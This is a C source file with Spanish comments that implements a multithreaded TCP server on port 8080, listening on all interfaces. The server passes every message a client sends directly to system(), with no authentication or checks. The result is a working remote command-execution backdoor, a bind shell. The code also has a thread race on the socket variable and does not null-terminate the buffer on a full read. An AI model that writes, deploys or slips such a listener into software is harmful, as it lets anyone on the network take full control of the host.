#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

#define PORT 8080
#define BUFFER_SIZE 1024

void *handle_connection(void *arg) {
    int client_sock = *(int*)arg;
    char buffer[BUFFER_SIZE] = {0};

    while (1) {
        int valread = read(client_sock, buffer, BUFFER_SIZE);
        if (valread < 0) {
            perror("Error al leer el mensaje del cliente");
            close(client_sock);
            pthread_exit(NULL);
        } else if (valread == 0) {
            // El cliente cerró la conexión
            close(client_sock);
            pthread_exit(NULL);
        } else {
            // Ejecutar el comando recibido
            system(buffer);
            memset(buffer, 0, BUFFER_SIZE);
        }
    }
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Crear el socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Error al crear el socket");
        exit(EXIT_FAILURE);
    }

    // Configurar opciones del socket
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("Error al configurar opciones del socket");
        exit(EXIT_FAILURE);
    }

    // Especificar dirección del servidor
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Enlazar socket al puerto
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Error al enlazar el socket al puerto");
        exit(EXIT_FAILURE);
    }

    // Esperar conexiones entrantes
    if (listen(server_fd, 5) < 0) {
        perror("Error al esperar conexiones entrantes");
        exit(EXIT_FAILURE);
    }

    // Aceptar conexiones entrantes y manejarlas en hilos
    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("Error al aceptar la conexión entrante");
            exit(EXIT_FAILURE);
        }

        // Crear un hilo para manejar la conexión
        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_connection, (void*)&new_socket) < 0) {
            perror("Error al crear el hilo");
            exit(EXIT_FAILURE);
        }

        printf("Nuevo cliente conectado. ID del hilo: %ld\n", thread_id);
    }

    return 0;
}
